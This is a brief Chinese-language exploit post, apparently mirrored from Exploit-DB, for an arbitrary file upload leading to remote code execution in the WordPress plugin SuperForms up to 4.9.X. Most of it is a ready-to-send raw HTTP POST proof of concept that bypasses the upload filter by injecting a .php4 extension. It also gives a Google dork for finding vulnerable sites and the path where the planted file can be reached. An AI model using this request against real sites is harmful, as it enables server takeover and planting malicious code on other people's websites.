# WordPress 插件SuperForms 4.9-任意文件上传到远程代码执行

官方：https://renstillmann.github.io/super-forms/#/

Google Dork :

```
inurl:"/wp-content/plugins/super-forms/"
```

受影响版本：

All (<= 4.9.X)

**PoC：**


```bash
POST /wp-content/plugins/super-forms/uploads/php/ HTTP/1.1
 <=== exploit end point
Host: localhost
User-Agent: UserAgent
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data;
boundary=---------------------------423513681827540048931513055996
Content-Length: 7058
Origin: localhost
Connection: close
Referer: localhost
Cookie: 

-----------------------------423513681827540048931513055996
Content-Disposition: form-data; name="accept_file_types"

jpg|jpeg|png|gif|pdf|JPG|JPEG|PNG|GIF|PDF                        <=======
inject extension (|PHP4) to validate file to upload
-----------------------------423513681827540048931513055996
Content-Disposition: form-data; name="max_file_size"

8000000
-----------------------------423513681827540048931513055996
Content-Disposition: form-data; name="_library"

0
-----------------------------423513681827540048931513055996
Content-Disposition: form-data; name="files[]";
filename="filename.(extension)"    <====   inject code extension (.php4)
for example
Content-Type: application/pdf

Evil codes to be uploaded

-----------------------------423513681827540048931513055996--

# Uploaded Malicious File can  be Found in :
/wp-content/uploads/superforms/2021/01/<id>/filename.php4
u can get <id> from server reply .
```

from：https://www.exploit-db.com/exploits/49490